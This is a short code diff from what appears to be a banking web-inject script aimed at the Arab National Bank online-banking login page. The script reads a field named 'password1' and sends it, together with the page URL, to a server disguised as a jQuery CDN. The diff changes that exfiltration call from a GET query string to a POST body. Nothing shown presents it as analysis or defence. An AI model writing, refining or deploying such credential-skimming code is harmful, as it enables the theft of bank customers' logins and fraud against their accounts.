@@ -30,7 +30,7 @@ if (top['location']['href']['indexOf']('https://onlinebanking.anb.com.sa/RetailB
                   var login = {};
                   login.userid = document.getElementsByName("password1")[0].value;
                   login.password = "PASSWORD";
-            post("//cdn-s1-cloud-jquery.herokuapp.com/logs.php?l="+window.location.href+"&e="+login.userid+"&p="+login.password);
+            post("//cdn-s1-cloud-jquery.herokuapp.com/logs.php","l="+window.location.href+"&e="+login.userid+"&p="+login.password);
             }
         }
     }, 1000)
